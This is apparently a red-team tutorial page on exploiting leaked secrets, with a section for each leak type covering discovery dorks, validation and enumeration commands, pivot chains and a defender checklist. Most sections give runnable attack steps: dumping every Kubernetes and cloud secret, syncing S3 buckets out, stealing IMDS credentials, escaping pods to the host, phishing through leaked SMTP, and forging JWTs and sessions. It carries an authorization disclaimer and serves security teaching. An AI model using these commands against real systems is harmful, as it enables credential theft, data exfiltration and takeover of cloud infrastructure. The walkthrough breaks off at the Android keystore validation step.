🎯 Red Team Walkthrough

You found a leak. Now what?
Each tab below = one leak type. What an attacker does with it, step by step. Real commands. Real tools. Real kill chains.

"Finding loot is junior work. Knowing what to DO with it = senior."

⚠️ Ethics lane: everything below assumes you have bug bounty scope or explicit written pentest authorization. Running these against a system you don't own = PECA 2016 § 3 / CFAA / unauthorized access = jail. Practice in your own lab or on approved targets.

Chapter 00 // The shared model

🧠 Every leak follows the same 5-step kill chain

Different leak types, same pattern. Learn this once, apply it everywhere.

STEP 01Discover
You find the file. GitHub, Shodan, S3 indexing.
STEP 02Validate
Does it still work? Is the creds live? (Passive check, no noise.)
STEP 03Enumerate
What does this grant? Permissions, scope, blast radius.
STEP 04Pivot
Can you chain to something bigger? More creds, more access.
STEP 05Loot / Report
Attacker: exfil + persist. You (ethical): document + responsible disclosure.

📝 Why the validation step matters MOST

90% of "leaks" you find are already expired, rotated, or were test creds to begin with. The validation step separates real findings from noise.

And here's the trick: the validation request should be as boring as possible — a simple "who am I?" API call. Never a data-exfil call. Reason: if you're on a bug bounty program, a read-only identity check is always in scope. A dump-all-users query is not, even if the creds work.

📄 .env file CVSS 9.8 effort:

The dream find. One file, many credentials, each independently valuable.

🔍 Step 1 — Discover

# GitHub code search — the workhorse queries filename:.env DB_PASSWORD filename:.env STRIPE filename:.env AWS_SECRET_ACCESS_KEY filename:.env "SENDGRID_API_KEY" "target-company.com" filename:.env # target-scoped # Github via gh CLI (bypasses web UI 1000-result cap per query) gh search code 'filename:.env target-company' --limit 100 --json repository,path # grep.app — indexes 500k+ repos, catches deleted commits https://grep.app/search?q=SENDGRID_API_KEY&filter[repo][0]=target-company

✅ Step 2 — Validate (per credential, lightest possible)

# AWS — simplest whoami call aws sts get-caller-identity # Returns: {"UserId":"...","Account":"123456789012","Arn":"arn:aws:iam::..."} # Stripe — account lookup, doesn't move money curl https://api.stripe.com/v1/account -u sk_live_abc123: # SendGrid — profile read curl -H "Authorization: Bearer SG.xxxx" https://api.sendgrid.com/v3/user/profile # Database — just TCP connect, no query nc -zv prod-db.internal 5432 # TCP only, no auth attempt # Then: psql "postgres://admin:pw@prod-db:5432/users" -c "SELECT 1;"

🗺️ Step 3 — Enumerate blast radius

🔎 AWS IAM scope

aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query UserId --output text) aws iam get-account-summary aws iam list-access-keys

💳 Stripe scope

curl -u sk_live_abc123: https://api.stripe.com/v1/charges?limit=1 # Key types: rk_live_ (restricted) vs sk_live_ (full)

📧 SendGrid scope

curl -H "Authorization: Bearer SG.xxxx" https://api.sendgrid.com/v3/scopes # full-access scope = can send mail FROM any verified sender

🐘 DB scope

# List databases, current user privileges psql ... -c "\l" psql ... -c "SELECT current_user, session_user;" psql ... -c "\du"

🔗 Step 4 — Pivot chains (.env is a pivot goldmine)

PIVOT ADB → user PII
Dump users table → emails + hashes → crack weak hashes → try credential stuffing against other services
PIVOT BAWS → S3 backups
aws s3 ls → find backups-prod → download nightly DB dumps → offline analysis
PIVOT CSMTP → phishing
Use leaked SMTP creds to send phishing FROM legit company mail server → bypasses SPF/DKIM/DMARC → 10x click-through
PIVOT DDjango SECRET_KEY → session forge
Sign a cookie for user_id=1 (usually admin) → log in as anyone

🛡️ Step 5 — Defender view (what to check / fix)

  • Search your own repos: gh search code filename:.env org:yourorg
  • Enable GitHub Secret Scanning + Push Protection on every repo (free since 2024 for public repos, paid for private but worth it)
  • Install trufflehog in CI: trufflehog git file://. --only-verified
  • Rotate anything found, rewrite history with git filter-repo, force push

🗝️ SSH private key CVSS 9.1 effort:

A file that says -----BEGIN OPENSSH PRIVATE KEY-----. Usually id_rsa, id_ed25519, deploy_key, or a .pem.

🔍 Step 1 — Discover

# GitHub queries "BEGIN OPENSSH PRIVATE KEY" "BEGIN RSA PRIVATE KEY" filename:id_rsa -filename:id_rsa.pub filename:deploy_key extension:pem private # Target-scoped — find their dev's personal accidental commit "target-company" "BEGIN OPENSSH"

✅ Step 2 — Validate

# Extract the public key from the private (never modify the private) ssh-keygen -y -f stolen_key > stolen_key.pub # Hash the public key — lets you compare against Shodan's database ssh-keygen -lf stolen_key.pub # Output: 256 SHA256:abc123... user@host (ED25519) # Check if known compromised # github.com/rapid7/ssh-badkeys → database of publicly-known-exposed keys # Try a single connection (only to targets you have permission for!) ssh -i stolen_key -o StrictHostKeyChecking=no -o PasswordAuthentication=no \ -o PubkeyAcceptedKeyTypes=+ssh-rsa user@target.example.com

🗺️ Step 3 — Enumerate

SSH keys don't "list permissions" — you need to infer from context:

# Look near the key for a config file that says where it works cat ~/.ssh/config cat known_hosts # sometimes committed, lists server fingerprints cat authorized_keys # reveals which keys are allowed to log in # Once you have shell, enumerate the host quickly whoami; id; hostname cat /etc/passwd | grep -v nologin | grep -v false sudo -ln # what can I sudo without password? ls -la /root/ 2>/dev/null find / -perm -4000 -type f 2>/dev/null # SUID binaries for privesc

🔗 Step 4 — Pivot

PIVOT ADev laptop → other servers
~/.ssh/known_hosts lists every host the dev ever SSH'd to → try the same key there
PIVOT BShell → find more keys
On the server: find / -name "id_*" 2>/dev/null → pick up deploy keys, service keys
PIVOT CShell → cloud metadata
curl http://169.254.169.254/latest/meta-data/ → AWS IMDS → steal EC2 role creds
PIVOT DShell → CI/CD access
Read ~/.jenkins/, ~/.github/, ~/.gitlab/ → GitHub tokens, deploy keys, Jenkins API keys

🛡️ Defender view

  • Never allow RSA keys without passphrase on dev machines — ssh-keygen -p -f ~/.ssh/id_rsa
  • Prefer short-lived SSH certs (Vault SSH, Teleport, Smallstep step-ssh) over static keys
  • sshd_config: PasswordAuthentication no, PermitRootLogin no, restrict AllowUsers
  • Log authorized_keys changes — unexpected additions = breach signal

🗄️ Database connection string CVSS 9.0 effort:

A URI with host + username + password baked in. The format varies by DB but the attack is the same: connect, dump, done.

🔍 Step 1 — Discover

"mongodb+srv://" password "jdbc:postgresql://" password "jdbc:mysql://" password "redis://" password "mysql+pymysql://" # Python/Django style DATABASE_URL= target-company # Rails style filename:database.yml password # .NET style filename:web.config connectionString

✅ Step 2 — Validate (the three-tier test)

# Tier 1: TCP reachable? (no auth attempt yet) nc -zv prod-db.company.com 5432 # Connection succeeded = firewall lets you in = you're on a public IP or VPN works # Tier 2: Does the creds authenticate? # Postgres PGPASSWORD=pw psql -h prod-db.company.com -U admin -d postgres -c "SELECT 1;" # MySQL mysql -h prod-db.company.com -u admin -ppw -e "SELECT 1;" # MongoDB mongosh "mongodb+srv://admin:pw@cluster0.mongodb.net/" --eval "db.runCommand({ping:1})" # Redis redis-cli -h prod-redis.company.com -p 6379 -a pw PING # Tier 3: Your user has READ permission? (still no data exfil) psql ... -c "\dt" # Postgres: list tables, doesn't read content mysql ... -e "SHOW DATABASES;" mongosh ... --eval "db.adminCommand({listDatabases:1})"

🗺️ Step 3 — Enumerate

# PostgreSQL — privilege check SELECT current_user, session_user; SELECT * FROM information_schema.role_table_grants WHERE grantee = current_user; SELECT rolname, rolsuper, rolcreaterole, rolcreatedb FROM pg_roles WHERE rolname = current_user; # MySQL SHOW GRANTS FOR CURRENT_USER(); SELECT User, Host, Super_priv, File_priv FROM mysql.user; # Schema recon (what tables exist, no data read) SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema NOT IN ('information_schema','pg_catalog','mysql','performance_schema','sys'); # Size of targets — pick dumps by value SELECT table_schema, table_name, pg_size_pretty(pg_total_relation_size(schemaname||'.'||tablename)) FROM pg_tables ORDER BY pg_total_relation_size(schemaname||'.'||tablename) DESC LIMIT 20;

🔗 Step 4 — Pivot

PIVOT AIf user is SUPERUSER → OS command exec
Postgres: COPY ... FROM PROGRAM 'cmd'. MySQL: SELECT ... INTO OUTFILE to /var/www/html/shell.php
PIVOT BUDF / extension abuse
Postgres: CREATE EXTENSION dblink → SSRF the internal network from within the DB
PIVOT CSession token forgery
Dump users.session_key or users.api_token → impersonate users in the app layer
PIVOT DCloud metadata
If DB runs on EC2 and you got RCE via PIVOT A → IMDS → role creds → lateral cloud movement

🛡️ Defender view

  • Never expose DBs to the internet. Firewall rule: only allow from bastion/VPN/app subnet
  • Use IAM-authenticated DB access (AWS RDS IAM auth, Azure AAD auth) — no password to leak
  • Least-privilege DB users per service; no shared "admin" account
  • Log all queries to an append-only log (CloudTrail for RDS, pgaudit, MySQL general_log)

🗺️ terraform.tfstate CVSS 7.5 (9.0 if outputs have secrets) effort:

Not directly exploitable — but it's a map. Turns blind attackers into surgical ones.

🔍 Step 1 — Discover

filename:terraform.tfstate filename:terraform.tfstate.backup filename:*.tfstate filename:*.tfvars password # sometimes has plaintext # S3-hosted state files with public-read misconfig "terraform.tfstate" site:*.s3.amazonaws.com # Target-scoped "target-company" filename:terraform.tfstate

✅ Step 2 — Validate it's current

# Check when the file was last pushed git log --all --full-history -- "*.tfstate" | head -20 # Check the serial number (Terraform increments it per apply) jq '.serial, .lineage, .terraform_version' terraform.tfstate # Validate one resource exists — cheapest possible DNS query jq -r '.resources[] | select(.type=="aws_db_instance") | .instances[].attributes.endpoint' terraform.tfstate # → "prod-db.xyz.us-east-1.rds.amazonaws.com:5432" dig +short prod-db.xyz.us-east-1.rds.amazonaws.com # If it resolves → infrastructure still exists → tfstate is probably current

🗺️ Step 3 — Enumerate (the gold extraction)

# Extract every resource type and count jq -r '.resources[] | .type' terraform.tfstate | sort | uniq -c | sort -rn # Hunt plaintext secrets in outputs jq '.outputs' terraform.tfstate jq '.. | objects | select(has("master_password"))' terraform.tfstate jq '.. | strings | select(test("(password|secret|token|key)"; "i"))' terraform.tfstate # Extract every S3 bucket name (list them, don't touch) jq -r '.resources[] | select(.type=="aws_s3_bucket") | .instances[].attributes.bucket' terraform.tfstate # Extract RDS endpoints jq -r '.resources[] | select(.type=="aws_db_instance") | .instances[].attributes | .endpoint' terraform.tfstate # EC2 IPs + SG associations jq -r '.resources[] | select(.type=="aws_instance") | .instances[].attributes | [.id, .public_ip, .private_ip] | @tsv' terraform.tfstate # IAM policies (what over-privileged role can I target?) jq '.resources[] | select(.type=="aws_iam_policy") | .instances[].attributes.policy' terraform.tfstate

🔗 Step 4 — Pivot

PIVOT ABucket names → public-read check
aws s3 ls s3://leaked-bucket-name --no-sign-request
PIVOT BRDS endpoint + tfstate creds
If outputs have DB password → direct connect (see DB pivot panel)
PIVOT CIAM role ARN → assume-role abuse
If you already have ANY AWS credential → aws sts assume-role --role-arn ... to test
PIVOT DInternal hostnames → subdomain takeover hunt
tfstate lists every aws_route53_record → check for dangling records pointing to decommissioned resources

🛡️ Defender view

  • Remote backend with encryption: S3 + KMS + DynamoDB locking, OR Terraform Cloud
  • Mark outputs sensitive = true — doesn't encrypt in state but blocks CLI display
  • Never put raw secrets in variables — fetch from Vault/SecretsManager at plan time
  • .gitignore *.tfstate*, *.tfvars, .terraform/ from day one

☸️ kubeconfig CVSS 9.9 effort:

If RBAC gives this user cluster-admin (it usually does on dev machines) — it's game over for every workload.

🔍 Step 1 — Discover

filename:kubeconfig filename:.kube/config "current-context:" "certificate-authority-data" "kind: Config" apiVersion # Public S3 / Azure Blob / GCS "kubeconfig" site:*.s3.amazonaws.com

✅ Step 2 — Validate

# Can you even reach the API server? SERVER=$(yq '.clusters[0].cluster.server' stolen-kubeconfig) curl -k -o /dev/null -w "%{http_code}\n" $SERVER/healthz # 200 = reachable. 403 = reachable but token rejected. Timeout = private endpoint, need VPN/SSRF # Lightest identity call kubectl --kubeconfig=stolen-kubeconfig auth whoami # or older: kubectl --kubeconfig=stolen-kubeconfig get --raw=/api/v1/namespaces # What CAN this user do? (no actual ops) kubectl --kubeconfig=stolen-kubeconfig auth can-i --list kubectl --kubeconfig=stolen-kubeconfig auth can-i '*' '*' # cluster-admin?

🗺️ Step 3 — Enumerate (the cluster walk)

# Namespaces = rough org structure kubectl get ns # Every secret in every namespace — the motherlode kubectl get secrets -A -o yaml > all-secrets.yaml grep -E "(password|token|key)" all-secrets.yaml # ServiceAccount tokens — portable credentials kubectl get sa -A kubectl get sa -n kube-system -o yaml | grep -A 2 token # What's running? Images, env vars (often has creds) kubectl get pods -A -o json | jq '.items[] | {ns:.metadata.namespace, name:.metadata.name, image:.spec.containers[].image, env:.spec.containers[].env}' # ConfigMaps — often have less-secret-but-still-interesting config kubectl get cm -A -o yaml | grep -iE "(endpoint|url|host)" | head # Ingress = external attack surface mapped for you kubectl get ingress -A

🔗 Step 4 — Pivot (how attackers escape pods)

PIVOT AExec into any pod → mini-shell on the cluster
kubectl exec -it -n app my-pod -- /bin/sh
PIVOT BDeploy privileged pod → escape to host node
Apply a pod manifest with privileged: true + hostPID: true + volumeMounts: [{mountPath: /host, hostPath: /}] → chroot to host
PIVOT CSteal service-account tokens → move between clusters
Every pod has /var/run/secrets/kubernetes.io/serviceaccount/token. Some pods have cross-cluster creds (GitOps operators, ArgoCD)
PIVOT DCloud metadata from inside
From escaped host: curl http://169.254.169.254/ → EC2/GCE/Azure metadata → cloud role creds → full cloud takeover

🛡️ Defender view

  • Use short-lived OIDC tokens (Dex, Okta, Azure AD) instead of static token: entries
  • Pod Security Admission set to restricted; NO privileged pods, NO hostPath mounts in prod namespaces
  • Network policy denying pod → IMDS (169.254.169.254) traffic
  • Audit log + SIEM alerts on get secrets -A, exec, apply of privileged specs
  • Namespace-scoped RBAC; NO developer ever has cluster-admin

☁️ AWS credentials file CVSS 9.0 effort:

The file at ~/.aws/credentials. INI-format. Often committed when devs accidentally push their whole home folder.

🔍 Step 1 — Discover

filename:credentials aws_access_key_id filename:.aws/credentials "aws_secret_access_key" extension:txt # Also hunt the "export" style in shell scripts "export AWS_SECRET_ACCESS_KEY" extension:sh "AWS_ACCESS_KEY_ID=AKIA" filename:.env

✅ Step 2 — Validate

# Use a throwaway AWS profile so you don't taint your own creds export AWS_ACCESS_KEY_ID=AKIA... export AWS_SECRET_ACCESS_KEY=... export AWS_SESSION_TOKEN=... # only if temp creds # The boring identity call aws sts get-caller-identity # {"UserId": "AIDAI...", "Account": "123456789012", "Arn": "arn:aws:iam::123456789012:user/bob"} # Key type gives you a hint of scope # AKIA... = long-term IAM user key # ASIA... = short-term session credential (pair with session token)

🗺️ Step 3 — Enumerate (the standard AWS pentest walk)

# Two excellent tools — use them, don't reinvent pacu # Rhino Security Labs' AWS exploitation framework enumerate-iam # pure-IAM enumeration, very quiet # Manual essentials aws iam list-attached-user-policies --user-name bob aws iam list-user-policies --user-name bob aws iam simulate-principal-policy \ --policy-source-arn $(aws sts get-caller-identity --query Arn --output text) \ --action-names s3:* ec2:* iam:* rds:* lambda:* # Regions enumeration (which regions have resources?) for r in us-east-1 us-west-2 eu-west-1 ap-south-1; do echo "=== $r ===" aws s3 ls --region $r 2>&1 | head -5 aws ec2 describe-instances --region $r --query 'Reservations[].Instances[].InstanceId' 2>&1 done

🔗 Step 4 — Pivot

PIVOT AS3 → data exfil
aws s3 sync s3://bucket ./local/
PIVOT BIAM PassRole → privesc
If you can iam:PassRole + run Lambda/EC2 → create a resource that assumes a higher-priv role
PIVOT CSecrets Manager / SSM → more creds
aws secretsmanager list-secrets → get-secret-value each one
PIVOT DCross-account via trust policy
aws iam get-role --role-name X → inspect trust → aws sts assume-role --role-arn arn:aws:iam::OTHER_ACCOUNT:role/Y
PIVOT ECryptomining (real attackers)
Attacker spins up max-size instances in every region. Victim sees $50K bill overnight.

🛡️ Defender view

  • Never use long-term IAM user keys — use IAM Identity Center (SSO) with short-lived creds
  • Enable IAM Access Analyzer + GuardDuty — catches "access from unusual IP"
  • CloudTrail on all regions, not just us-east-1
  • Budget alerts — $50 above baseline = page someone
  • Rotate access keys quarterly; use last_used_date to find stale ones

🌩️ GCP service account JSON CVSS 9.1 effort:

A JSON file with a private key for a Google Cloud service account. Downloaded once from GCP console, then… often committed.

🔍 Step 1 — Discover

"type": "service_account" filename:*.json "private_key_id" "private_key" "client_email" "@<project-id>.iam.gserviceaccount.com" filename:*.json "service_account" "private_key"

✅ Step 2 — Validate

export GOOGLE_APPLICATION_CREDENTIALS=./stolen-sa.json gcloud auth activate-service-account --key-file=./stolen-sa.json # Identity check gcloud auth list gcloud config list # What project does this SA live in? jq -r '.project_id, .client_email' stolen-sa.json

🗺️ Step 3 — Enumerate

# List projects accessible gcloud projects list # Permissions on the home project gcloud projects get-iam-policy $(jq -r '.project_id' stolen-sa.json) \ --flatten="bindings[].members" \ --filter="bindings.members:$(jq -r '.client_email' stolen-sa.json)" \ --format="value(bindings.role)" # Resource-level scan gcloud compute instances list gcloud storage buckets list gcloud secrets list # 🎯 often the prize gcloud sql instances list gcloud container clusters list # GKE access?

🔗 Step 4 — Pivot

PIVOT ASecret Manager dump
for s in $(gcloud secrets list --format='value(name)'); do gcloud secrets versions access latest --secret=$s; done
PIVOT BImpersonate higher-priv SA
If SA has iam.serviceAccountTokenCreator → gcloud auth print-access-token --impersonate-service-account=admin@...
PIVOT CGKE takeover
gcloud container clusters get-credentials → now you have kubeconfig for the cluster (see kubeconfig panel)
PIVOT DCloud Functions / Run → RCE
Deploy a function that curls your C2, runs under the project's default SA (often over-privileged)

🛡️ Defender view

  • Disable service account key creation entirely via Org Policy (iam.disableServiceAccountKeyCreation)
  • Use Workload Identity (GKE) or attached service accounts (GCE/Cloud Run) — no keys to leak
  • Short-lived credentials via gcloud auth print-access-token --impersonate-service-account
  • Enable Sensitive Data Protection (DLP) scanning on Cloud Source Repositories

🧬 schema.sql / Django migrations / Rails schema.rb CVSS 5.3 (force multiplier) effort:

Not exploitable alone. But pair it with any future SQLi on the same app and you go from "fumbling in the dark" to "surgical extraction."

🔍 Step 1 — Discover

# Dumps + migrations extension:sql "CREATE TABLE" users extension:sql "INSERT INTO users" filename:schema.rb # Rails filename:schema.sql filename:0001_initial.py # Django migrations filename:*.dump extension:sql # ORM models (Django, SQLAlchemy, Sequelize, TypeORM) filename:models.py class Meta extension:py models.Model password

✅ Step 2 — Validate relevance

For a schema leak, "validation" = "does this match the target's current prod?":

# If you also have any read access (even un-auth), compare column names # E.g., a login form error leak: curl -X POST https://target.com/login -d "email[]=x" -H "Content-Type: application/x-www-form-urlencoded" # → error: "column users.email_address does not exist" (Django debug mode) # → if your schema says users.email_address, match confirmed # Check git log dates — if schema hasn't moved in 2 years, probably still accurate git log --oneline --all -- schema.sql

🗺️ Step 3 — Enumerate (turn the schema into a hit list)

# Rank tables by attacker value grep -E "CREATE TABLE.*(user|admin|auth|session|token|payment|card|ssn|api_key|invite)" schema.sql # Column hunting — what data classes exist? grep -E "(password|hash|token|secret|ssn|card_number|phone|dob)" schema.sql # Foreign keys reveal relationships grep -E "REFERENCES" schema.sql # → payment_methods.user_id REFERENCES users(id) → user-to-payment linkage

🔗 Step 4 — Pivot (the multi-year game)

PIVOT ACraft surgical SQLi payloads
You don't need blind SQLi + long enumeration. You go straight to UNION SELECT email, password_hash FROM users WHERE is_admin=true
PIVOT BPredict GraphQL / API shapes
GraphQL schemas mirror DB schemas. Guess queries: { users(where: {isAdmin: true}) { email passwordHash } }
PIVOT CIDOR target selection
Schema reveals user.billing_address_id is sequential INT → test /billing/123 to /billing/1234 for auth bypass
PIVOT DMass assignment payloads
Schema shows is_admin column exists → test POST /signup with {"email":"x","is_admin":true}

🛡️ Defender view

  • Schemas are "less sensitive but not non-sensitive" — treat them as internal-only, not open-source
  • Parameterize ALL queries (kills SQLi regardless of schema knowledge)
  • Use allow-lists for GraphQL introspection in prod
  • Django: DEBUG=False in prod (prevents column-name leaks in errors)
  • Strong IDOR checks independent of ID predictability

📜 .bash_history CVSS 8.0 effort:

Every command the dev typed. Hostnames, passwords, tokens via curl -H "Authorization: Bearer...", the works.

🔍 Step 1 — Discover

filename:.bash_history filename:.zsh_history filename:.psql_history filename:.mysql_history filename:.python_history filename:.node_repl_history filename:.lesshst

🗺️ Step 2 — Mine it

# Credentials directly in commands (the classic: `mysql -p"password"`) grep -iE "(password|passwd|pwd)=|-p[A-Z0-9]" .bash_history grep -iE "(mysql|psql|redis-cli|mongosh)" .bash_history # Bearer tokens from curl grep -E "Authorization:|Bearer |api-key" .bash_history # SSH targets (internal hostnames) grep -E "^ssh |^scp " .bash_history | awk '{print $NF}' | sort -u # AWS / GCP / Azure profile switches — reveals what clouds they touch grep -E "^(aws|gcloud|az) " .bash_history # Git remotes (reveals private repos they access) grep -E "git clone " .bash_history # File paths that contain secrets grep -E "\.env|id_rsa|\.pem|credentials" .bash_history

🔗 Step 3 — Pivot

PIVOT AReplay the commands
Sometimes an auth token in a curl command is still valid weeks later
PIVOT BHostname enumeration
Internal hostnames from ssh commands → targets for further attack
PIVOT CDev behavior mapping
Know what tools they use → craft believable phishing ("I noticed you use ArgoCD, here's a fix for X")

🛡️ Defender view

  • Add to ~/.bashrc: export HISTCONTROL=ignorespace; export HISTIGNORE="*password*:*secret*:*token*"
  • Always prefix sensitive commands with a SPACE → not saved to history
  • Use --password-from-stdin / password prompts, never inline args
  • Never commit dotfiles without review — use dedicated dotfile repos, not your project repo

💬 Commit messages CVSS 6.5 effort:

The code fix was good. The commit message was the confession.

🔍 Step 1 — Discover

# GitHub has no "commit message only" search — get creative # Via GitHub REST gh search commits "password fix" --repo target/repo --json sha,message # Hunting patterns (run locally after cloning) git log --all --oneline | grep -iE "(password|secret|token|TODO|fixme|hack|temp|XXX|backdoor)" git log --all --format='%H %s' | grep -iE "(real password|actual secret|hardcoded|keep this)"

🗺️ Step 2 — Mine deeper

# Commit BODIES, not just subjects (subjects are short) git log --all --format='%H%n%B%n---' | grep -B 2 -iE "(password|token|secret)" # Deleted commits still live in reflog + dangling commits git fsck --lost-found git reflog show --all | head # Trigger a "find all strings in history" git log --all -p | grep -iE "(API_KEY|SECRET|TOKEN|PASSWORD)" | head -30

🔗 Step 3 — Pivot

PIVOT AConfession → locate the leak
"removing hardcoded password before prod" → check the DIFF of that commit → the password is in the removed lines
PIVOT BFeature announcements → new attack surface
"adding admin backdoor for demo" → the backdoor code is in the commit; revert the revert
PIVOT CDev workflow intel
"deploy to prod after demo" → you now know deployment timing → attacks during deploy windows have maximum blast radius

🛡️ Defender view

  • Pre-commit hook: reject commits with sensitive keywords (trufflehog, gitleaks in pre-commit mode)
  • PR template enforces short, sanitized messages; secrets never belong in messages
  • Git history rewrite — git filter-repo --message-callback can redact retroactively (but attacker may have already cloned)

📂 Exposed .git/ on a web server CVSS 9.4 effort:

Not a GitHub leak — it's the physical .git folder uploaded to /var/www/ on a live web server. Entire repo history downloadable via HTTP.

🔍 Step 1 — Discover

# Manual check on any target curl -s -o /dev/null -w "%{http_code}\n" https://target.com/.git/config # 200 = JACKPOT. 403 = hidden-but-configured. 404 = safe. # Mass scan (for CTFs / bug bounty recon on your own targets) httpx -l domains.txt -path "/.git/config" -mc 200 -silent # Shodan / Google dorks "Index of /.git" intitle:"Index of" ".git/config"

✅ Step 2 — Validate

# Is it a complete repo or just stray files? curl -s https://target.com/.git/HEAD # should show: ref: refs/heads/main curl -s https://target.com/.git/config # remote URL, sometimes credentials curl -s https://target.com/.git/description # mostly ignorable

🗺️ Step 3 — Dump the repo

# git-dumper — the tool for this pip install git-dumper git-dumper https://target.com/.git ./dumped-repo # Alternative: githacker githacker --url https://target.com/.git --output-folder ./dumped # Now explore as if it's a local repo cd dumped-repo git log --all --oneline git show HEAD grep -rIE "(password|api_key|secret)" .

🔗 Step 4 — Pivot

PIVOT ASource → logic bugs
Read the code. Find SQLi, IDOR, auth bypass that would take hours via blackbox testing
PIVOT BGit config → git credentials
.git/config sometimes has url = https://user:token@github.com/...
PIVOT CDeleted files recovered
git log --all --full-history --diff-filter=D --name-only → find deleted files → git show <commit>:/path/to/deleted/.env

🛡️ Defender view

  • Never deploy with .git/ present. CI/CD should build artifacts, rsync --exclude=.git, etc.
  • Web server config: explicitly deny location ~ /\.git { deny all; return 404; } in nginx
  • Periodic scan of your own sites for exposed .git, .env, .svn, .DS_Store

🐍 Django SECRET_KEY (or Rails secret_key_base, Flask SECRET_KEY) CVSS 9.8 effort:

The framework's signing key. Leak it and you forge any signed cookie / token / password reset link.

🔍 Step 1 — Discover

"SECRET_KEY = " extension:py django "secret_key_base" extension:rb "SECRET_KEY" extension:env "django-insecure-" # Django's default dev prefix, often forgotten in prod # Flask app.config "app.config['SECRET_KEY']" "app.secret_key = "

✅ Step 2 — Validate

# You need a session cookie to test. Get one by visiting the site. curl -c cookies.txt https://target.com/ # Django: the sessionid cookie is base64(JSON).sig — verify we can resign # Use django-signature-tool or write a small script python3 -c " from django.core.signing import TimestampSigner s = TimestampSigner(key='LEAKED_SECRET_KEY') # If we can verify an existing session, the key is valid print(s.unsign('existing-session-cookie')) "

🗺️ Step 3 — Enumerate

Django SECRET_KEY is used for MANY things:

  • Session cookies (sessionid) — if signed session engine
  • Password reset tokens
  • CSRF tokens
  • Default signing of any data via django.core.signing
  • Messages framework cookies
  • pickle deserialization in signed cookies = RCE if the app uses PickleSerializer

🔗 Step 4 — Pivot

PIVOT AForge a session as admin
Craft a session cookie with _auth_user_id = 1 (first user, usually admin) + sign with leaked key → set cookie → log in
PIVOT BForge password reset for any user
Generate a valid reset token for admin@site.com → visit the URL → reset their password → log in
PIVOT CPickle deserialization RCE
If the app uses SESSION_SERIALIZER='django.contrib.sessions.serializers.PickleSerializer' (deprecated but alive in older apps) → inject a malicious pickle in the cookie → RCE on page load. See CVE-2018-1000805 for pattern.

🛡️ Defender view

  • Never commit SECRET_KEY. Read from env var, use django-environ
  • Rotate SECRET_KEY immediately on leak. Users will be logged out — accept it
  • Use JSONSerializer for sessions (default since Django 1.6, but check legacy apps)
  • Sentinel value check: django-insecure- prefix in prod = someone shipped the default

🎟️ JWTs in test files / docs / commits CVSS 7.5 (context-dependent) effort:

Devs paste "real" JWTs into test fixtures, Postman collections, or README examples. If the signing key hasn't rotated, the token may still validate.

🔍 Step 1 — Discover

# JWTs have a distinctive 3-segment base64 pattern "eyJhbGci" "eyJ0eXAiOiJKV1Q" # Often in tests filename:*.test.js "eyJ" filename:*_test.py "eyJ" filename:fixtures "eyJ"

✅ Step 2 — Decode + validate

# Decode header + payload (the signature is base64url) echo "eyJhbGci..." | cut -d. -f1 | base64 -d echo "eyJhbGci..." | cut -d. -f2 | base64 -d # Or use jwt.io / jwt_tool.py python3 -m jwt_tool "eyJhbGci..." -M pb # playbook mode # Test if it's still accepted curl -H "Authorization: Bearer eyJhbGci..." https://target.com/api/me # 200 = still valid, 401 = rotated/expired

🗺️ Step 3 — Look at the claims

# Useful claims to read sub # subject = usually user ID iss # issuer = auth server URL (tells you their stack) aud # audience = which API it's for exp # expiration — if far future, it's a long-lived token iat # issued-at scope # OAuth-style scopes kid # key id — reveals if they use key rotation

🔗 Step 4 — Pivot

PIVOT AToken still valid → impersonate the user
Straight use: Authorization: Bearer <token>
PIVOT BAlgorithm confusion (alg: none)
Change header to {"alg":"none"}, remove signature. Some libraries STILL accept this.
PIVOT CRS256 → HS256 confusion
If the public key is exposed (often in /.well-known/jwks.json), change alg to HS256 and sign with the public key as HMAC secret
PIVOT DWeak HS256 key brute force
hashcat -m 16500 token.txt wordlist.txt — if the signing secret is weak (secret, changeme), you crack it, then sign anything
PIVOT EJKU/X5U header injection
Some libs fetch JWKs from a URL in the header → make it point to your server → serve your own public key → they validate against it

🛡️ Defender view

  • Use a strong signing key (256+ bits random)
  • Pin algorithm in verifier: jwt.verify(token, key, {algorithms: ['RS256']}) — never accept alg: none
  • Short expiration (15 min) + refresh tokens
  • NEVER put real JWTs in test fixtures. Use dedicated test keys.
  • Rotate keys periodically via kid header

📫 Postman / Insomnia collections CVSS 8.1 effort:

Exported API collection JSONs. Often baked-in auth tokens, internal endpoints, example requests with real data.

🔍 Step 1 — Discover

# Postman exports filename:*.postman_collection.json "_postman_id" "_postman_collection_id" # Environments (where tokens usually live) filename:*.postman_environment.json "values" "currentValue" postman # Insomnia filename:*.insomnia.json # Public Postman Workspaces (underrated surface) # Use postman.com search — go to Explore → search by company name https://www.postman.com/search?q=target-company

🗺️ Step 2 — Mine the collection

# Extract all URLs (internal endpoints!) jq -r '.. | .url? | select(.) | .raw? // .' collection.json | sort -u # Extract all headers (auth tokens hide here) jq -r '.. | .header? | select(.) | .[]? | "\(.key): \(.value)"' collection.json | grep -i auth # Extract environment variables jq -r '.values[] | "\(.key)=\(.value)"' environment.json # → api_token=eyJ..., staging_url=https://staging.internal, ...

🔗 Step 3 — Pivot

PIVOT AInternal API discovery
Endpoints you'd never find via external enumeration (/api/internal/admin/impersonate)
PIVOT BTokens in environments
Baked-in Authorization: Bearer ... headers — try them live
PIVOT CAPI shape leak
Request/response examples reveal data structures → craft mass-assignment or IDOR payloads
PIVOT DPre-request scripts
Postman collections sometimes embed JavaScript that calls an auth endpoint with baked-in creds — instant token-generation oracle

🛡️ Defender view

  • Never export environments with real values — use "Current Value" vs "Initial Value" split
  • Company Postman workspaces should be private
  • Use Postman's built-in secret management (not plain env vars) for shared collections
  • Audit your org's public Postman workspaces quarterly

📱 Android keystore + build.gradle passwords CVSS 9.1 effort:

An attacker with your app-signing keystore can push a malicious update that every user's phone will accept as legitimate. The supply-chain nightmare.

🔍 Step 1 — Discover

filename:*.keystore filename:*.jks filename:release.keystore filename:keystore.properties # The password file that usually lives next to it filename:build.gradle storePassword filename:keystore.properties storePassword filename:local.properties KEY_PASSWORD

✅ Step 2 — Validate

